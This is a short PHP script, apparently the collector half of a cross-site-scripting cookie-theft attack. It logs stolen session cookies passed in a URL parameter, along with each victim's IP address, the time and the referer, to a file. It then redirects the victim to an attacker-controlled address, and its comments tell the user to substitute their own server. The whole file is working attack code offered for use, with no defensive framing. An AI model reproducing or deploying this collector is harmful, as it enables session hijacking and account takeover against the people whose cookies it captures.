<?php
// this script should run on the target machine on the webpage
header ("Location: http://192.168.43.224:6789"); //Change it to your webserver address
$cookie = $_GET['c'];
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=getenv ('HTTP_REFERER');
$fp = fopen('cookies.html', 'a');
fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Referer: '.$referer.'<br><br><br>');
fclose($fp);
?>
